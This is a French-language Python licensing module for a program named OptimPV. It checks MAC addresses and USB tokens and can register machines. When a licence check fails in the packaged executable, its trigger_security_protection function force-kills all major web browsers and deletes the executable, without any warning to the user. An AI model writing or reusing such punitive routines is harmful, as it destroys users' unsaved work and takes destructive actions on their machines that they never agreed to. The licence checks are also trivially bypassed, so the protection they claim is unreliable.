#!/usr/bin/env python3
"""
Module de protection hardware pour OptimPV - VERSION CORRIGÉE
"""

import os
import sys
import json
import uuid
import hashlib
import platform
import functools
import subprocess
import time
from typing import Dict, List, Tuple, Any, Optional

def get_application_path():
    """Retourne le chemin de l'application"""
    if getattr(sys, 'frozen', False):
        if hasattr(sys, '_MEIPASS'):
            return sys._MEIPASS
        else:
            return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))

def get_primary_mac_address() -> str:
    """Récupère l'adresse MAC principale"""
    try:
        if platform.system() == "Windows":
            try:
                result = subprocess.run(
                    ['getmac', '/v'],
                    capture_output=True,
                    text=True,
                    timeout=10,
                    creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
                )
                lines = result.stdout.split('\n') # Utilisation de \n simple

                for line in lines:
                    if ('Ethernet' in line and 'Intel' in line and
                        not 'Virtual' in line):
                        parts = line.split()
                        for part in parts:
                            if '-' in part and len(part) == 17:
                                return part.replace('-', ':').upper()
            except:
                pass

        # Fallback
        mac = uuid.getnode()
        mac_hex = ':'.join(['{:02x}'.format((mac >> elements) & 0xff)
                           for elements in range(0,2*6,2)][::-1])
        return mac_hex.upper()

    except:
        return "00:00:00:00:00:00"

class LicenseManager:
    """Gestionnaire de licences hardware"""

    def __init__(self, license_file: str = "license.json"):
        self.license_file = license_file
        self.app_path = get_application_path()

        # Chemins de configuration
        self.config_paths = [
            os.path.join(os.path.expanduser("~"), "AppData", "Local", "OptimPV", license_file),
            os.path.join(self.app_path, license_file),
            license_file
        ]

        # Créer AppData
        appdata_dir = os.path.join(os.path.expanduser("~"), "AppData", "Local", "OptimPV")
        try:
            os.makedirs(appdata_dir, exist_ok=True)
        except:
            pass

        # Compatibilité hw_protection
        from types import SimpleNamespace
        self.hw_protection = SimpleNamespace()
        self.hw_protection.authorized_macs = []
        self.hw_protection.authorized_systems = []
        self.hw_protection.license_data = None
        self.hw_protection.load_license = lambda: self.load_license()
        self.hw_protection.save_license = lambda data=None: self.save_license(data or self.hw_protection.license_data)
        self.hw_protection.remove_authorization = self.remove_authorization_from_hw

    def remove_authorization_from_hw(self, mac_address: str) -> bool:
        """Supprime une autorisation MAC"""
        try:
            license_data = self.load_license()
            if license_data and mac_address in license_data.get("authorized_mac_addresses", []):
                license_data["authorized_mac_addresses"].remove(mac_address)
                self.hw_protection.authorized_macs = license_data["authorized_mac_addresses"]
                return self.save_license(license_data)
            return False
        except:
            return False

    def get_machine_info(self) -> Dict[str, Any]:
        """Récupère les informations de la machine"""
        return {
            "hostname": platform.node(),
            "platform": platform.platform(),
            "machine_id": self.get_machine_id(),
            "mac_addresses": [get_primary_mac_address()],
            "application_path": self.app_path,
            "is_exe": getattr(sys, 'frozen', False)
        }

    def get_machine_id(self) -> str:
        """Génère un ID unique pour cette machine"""
        try:
            hostname = platform.node()
            mac_address = get_primary_mac_address()
            platform_info = platform.platform()

            unique_string = f"{hostname}_{mac_address}_{platform_info}"
            machine_id = hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()
            return machine_id
        except:
            return "UNKNOWN_MACHINE"

    def load_license(self) -> Optional[Dict]:
        """Charge le fichier de licence"""
        for path in self.config_paths:
            try:
                if os.path.exists(path):
                    with open(path, 'r', encoding='utf-8') as f:
                        license_data = json.load(f)
                        self.hw_protection.license_data = license_data
                        self.hw_protection.authorized_macs = license_data.get("authorized_mac_addresses", [])
                        self.hw_protection.authorized_systems = license_data.get("authorized_machines", [])
                        return license_data
            except:
                continue
        return None

    def save_license(self, license_data: Dict) -> bool:
        """Sauvegarde le fichier de licence"""
        self.hw_protection.license_data = license_data
        self.hw_protection.authorized_macs = license_data.get("authorized_mac_addresses", [])

        # AppData d'abord
        try:
            appdata_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "OptimPV")
            os.makedirs(appdata_path, exist_ok=True)
            license_path = os.path.join(appdata_path, self.license_file)
            with open(license_path, 'w', encoding='utf-8') as f:
                json.dump(license_data, f, indent=2)
            return True
        except:
            pass

        # Répertoire app
        try:
            license_path = os.path.join(self.app_path, self.license_file)
            with open(license_path, 'w', encoding='utf-8') as f:
                json.dump(license_data, f, indent=2)
            return True
        except:
            pass

        # Répertoire courant
        try:
            with open(self.license_file, 'w', encoding='utf-8') as f:
                json.dump(license_data, f, indent=2)
            return True
        except:
            return False

    def check_license(self) -> Tuple[bool, str]:
        """Vérifie si la machine est autorisée"""
        try:
            license_data = self.load_license()
            if not license_data:
                return False, "ACCÈS REFUSÉ: Aucune licence trouvée"

            primary_mac = get_primary_mac_address()
            if primary_mac == "00:00:00:00:00:00":
                return False, "ACCÈS REFUSÉ: Impossible de détecter l'adresse MAC"

            authorized_macs = license_data.get("authorized_mac_addresses", [])

            if primary_mac in authorized_macs:
                return True, f"Machine autorisée - MAC: {primary_mac}"

            return False, f"ACCÈS REFUSÉ: MAC non autorisée ({primary_mac})"

        except Exception as e:
            return False, f"ACCÈS REFUSÉ: Erreur système ({str(e)})"

    def register_machine(self) -> Tuple[bool, str]:
        """Enregistre l'adresse MAC principale"""
        try:
            primary_mac = get_primary_mac_address()
            if primary_mac == "00:00:00:00:00:00":
                return False, "Impossible de détecter l'adresse MAC principale"

            license_data = self.load_license() or {
                "version": "1.0",
                "authorized_mac_addresses": [],
                "authorized_machines": []
            }

            if primary_mac not in license_data["authorized_mac_addresses"]:
                license_data["authorized_mac_addresses"].append(primary_mac)

                if self.save_license(license_data):
                    return True, f"Machine enregistrée avec succès - MAC: {primary_mac}"
                else:
                    return False, "Erreur lors de la sauvegarde"
            else:
                return True, f"Machine déjà enregistrée - MAC: {primary_mac}"

        except Exception as e:
            return False, f"Erreur lors de l'enregistrement: {str(e)}"

    def check_usb_token(self, drive_letter: str = "G", token_file: str = "sys.dat") -> Tuple[bool, str]:
        """Vérifie la présence d'un token USB"""
        try:
            token_path = os.path.join(f"{drive_letter}:", token_file)

            drive_path = f"{drive_letter}:\\" # Corrigé ici aussi
            if not os.path.exists(drive_path):
                return False, f"Lecteur {drive_letter}: non trouvé"

            if os.path.exists(token_path):
                try:
                    with open(token_path, 'r', encoding='utf-8') as f:
                        token = f.read().strip()
                        if token:
                            return True, f"Token USB valide trouvé: {token[:8]}..."
                except:
                    return False, f"Token USB corrompu sur {drive_letter}:\\" # Corrigé
            
            return False, f"Token USB non trouvé sur {drive_letter}:\\" # Corrigé

        except Exception as e:
            return False, f"Erreur token USB: {str(e)}"

    def create_usb_token(self, drive_letter: str = "G", token_file: str = "sys.dat",
                        custom_token: Optional[str] = None) -> Tuple[bool, str]:
        """Crée un fichier token sur la clé USB"""
        try:
            drive_path = f"{drive_letter}:\\" # Corrigé
            if not os.path.exists(drive_path):
                return False, f"Lecteur {drive_letter}: non trouvé"

            if custom_token:
                token_content = custom_token
            else:
                machine_id = self.get_machine_id()
                timestamp = int(time.time())
                token_content = f"OPTIMPV_TOKEN_{machine_id}_{timestamp}"

            token_path = os.path.join(drive_path, token_file)

            with open(token_path, 'w', encoding='utf-8') as f:
                f.write(token_content)

            return True, f"Token USB créé: {token_path}"

        except Exception as e:
            return False, f"Erreur création token: {str(e)}"

    def show_license_status(self) -> Dict[str, Any]:
        """Affiche le statut de la licence"""
        try:
            usb_valid, usb_message = self.check_usb_token()
            license_valid, license_message = self.check_license()
            machine_info = self.get_machine_info()

            return {
                "usb_valid": usb_valid,
                "usb_message": usb_message,
                "license_valid": license_valid,
                "license_message": license_message,
                "machine_info": machine_info,
                "overall_valid": usb_valid or license_valid,
                "exe_mode": getattr(sys, 'frozen', False),
                "app_path": self.app_path
            }
        except Exception as e:
            return {
                "usb_valid": False,
                "usb_message": f"Erreur USB: {str(e)}",
                "license_valid": False,
                "license_message": f"Erreur licence: {str(e)}",
                "machine_info": self.get_machine_info(),
                "overall_valid": False,
                "exe_mode": getattr(sys, 'frozen', False),
                "app_path": self.app_path
            }

def require_license(func):
    """Décorateur qui vérifie la licence"""
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        license_manager = LicenseManager()

        # Vérifier USB d'abord
        usb_valid, usb_message = license_manager.check_usb_token()
        if usb_valid:
            print(f"[CLE] {usb_message}")
            return func(*args, **kwargs)

        # Vérifier licence classique
        authorized, message = license_manager.check_license()
        if authorized:
            print(f"[OK] {message}")
            return func(*args, **kwargs)
        else:
            print(f"[ERREUR] ACCÈS REFUSÉ: {message}")
            print("\n[SOLUTIONS] Solutions:")
            print("   1. Insérez votre clé USB autorisée")
            print("   2. Exécutez: python hardware_protection.py --register")
            print("   3. Contactez l'administrateur")

            machine_info = license_manager.get_machine_info()
            print(f"[CLE] ID de cette machine: {machine_info['machine_id']}")

            if getattr(sys, 'frozen', False):
                trigger_security_protection()

            sys.exit(1)

    return wrapper

def trigger_security_protection():
    """Déclenche la protection de sécurité"""
    print("[SECURITE] PROTECTION DE SÉCURITÉ ACTIVÉE")

    import threading

    def delayed_protection():
        time.sleep(2)

        try:
            import subprocess

            # Tuer navigateurs
            browsers = ["chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe"]
            for browser in browsers:
                try:
                    subprocess.run(["taskkill", "/F", "/IM", browser],
                                 capture_output=True, shell=True) # shell=True peut être un risque de sécurité.
                except:
                    pass

            # Supprimer EXE
            if getattr(sys, 'frozen', False):
                try:
                    exe_path = sys.executable
                    time.sleep(1)
                    os.remove(exe_path)
                except:
                    pass

        except:
            pass

        try:
            os._exit(1)
        except:
            sys.exit(1)

    protection_thread = threading.Thread(target=delayed_protection, daemon=True)
    protection_thread.start()

# Fonctions de compatibilité
def get_mac_addresses() -> List[str]:
    """Récupère l'adresse MAC principale"""
    primary_mac = get_primary_mac_address()
    return [primary_mac] if primary_mac != "00:00:00:00:00:00" else []

def get_machine_id() -> str:
    """Génère un ID unique pour cette machine"""
    license_manager = LicenseManager()
    return license_manager.get_machine_id()

class HardwareProtection:
    """Classe de protection hardware pour compatibilité"""

    def __init__(self, license_manager=None):
        self.license_manager = license_manager or LicenseManager()
        self.authorized_macs = []
        self.authorized_systems = []
        self.license_data = None

    def load_license(self):
        """Charge les données de licence"""
        self.license_data = self.license_manager.load_license()
        if self.license_data:
            self.authorized_macs = self.license_data.get("authorized_mac_addresses", [])
            self.authorized_systems = self.license_data.get("authorized_machines", [])
        return self.license_data

    def save_license(self, data=None) -> bool:
        """Sauvegarde les données de licence"""
        if data:
            self.license_data = data
        elif self.license_data:
            self.license_data["authorized_mac_addresses"] = self.authorized_macs
            self.license_data["authorized_machines"] = self.authorized_systems

        if self.license_data:
            return self.license_manager.save_license(self.license_data)
        return False

    def remove_authorization(self, mac_address: str) -> bool:
        """Supprime une autorisation MAC"""
        try:
            if mac_address in self.authorized_macs:
                self.authorized_macs.remove(mac_address)
                return self.save_license()
            return False
        except:
            return False

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Gestionnaire de protection hardware OptimPV")
    parser.add_argument('--register', action='store_true', help='Enregistrer cette machine')
    parser.add_argument('--check', action='store_true', help='Vérifier la licence')
    parser.add_argument('--info', action='store_true', help='Afficher les infos machine')
    parser.add_argument('--create-usb', action='store_true', help='Créer un token USB')
    parser.add_argument('--check-usb', action='store_true', help='Vérifier le token USB')

    args = parser.parse_args()

    license_manager = LicenseManager()

    if args.register:
        success, message = license_manager.register_machine()
        print(f"[ENREGISTREMENT] Enregistrement: {'[OK] Succès' if success else '[ERREUR] Échec'}")
        print(f"   {message}")

    elif args.check:
        status = license_manager.show_license_status()
        print(f"[CLE] USB: {'[OK]' if status['usb_valid'] else '[ERREUR]'} {status['usb_message']}")
        print(f"[LICENCE] Licence: {'[OK]' if status['license_valid'] else '[ERREUR]'} {status['license_message']}")
        print(f"[STATUT] Statut global: {'[OK] AUTORISÉ' if status['overall_valid'] else '[ERREUR] REFUSÉ'}")
        print(f"[MODE] Mode EXE: {'[OK]' if status['exe_mode'] else '[NON]'}")
        print(f"[CHEMIN] Chemin app: {status['app_path']}")
        print("[RESEAU] Adresses MAC:")
        for mac in status['machine_info']['mac_addresses']:
            print(f"   • {mac}")
        print("="*40)

    elif args.info:
        machine_info = license_manager.get_machine_info()
        print("\n[PC] INFORMATIONS MACHINE")
        print("="*40)
        print(f"Nom: {machine_info['hostname']}")
        print(f"ID: {machine_info['machine_id']}")
        print(f"Plateforme: {machine_info['platform']}")
        print(f"Mode EXE: {machine_info['is_exe']}")
        print(f"Chemin app: {machine_info['application_path']}")
        print("[RESEAU] Adresses MAC:")
        for mac in machine_info['mac_addresses']:
            print(f"   • {mac}")
        print("="*40)

    elif args.create_usb:
        success, message = license_manager.create_usb_token()
        print(f"[CLE] Création token USB: {'[OK] Succès' if success else '[ERREUR] Échec'}")
        print(f"   {message}")

    elif args.check_usb:
        valid, message = license_manager.check_usb_token()
        print(f"[VERIFICATION] Vérification USB: {'[OK] Valide' if valid else '[ERREUR] Invalide'}")
        print(f"   {message}")

    else:
        print("[INFO] Utilisez --help pour voir les options disponibles")
        print(f"[MODE] Mode actuel: {'EXE' if getattr(sys, 'frozen', False) else 'Python'}")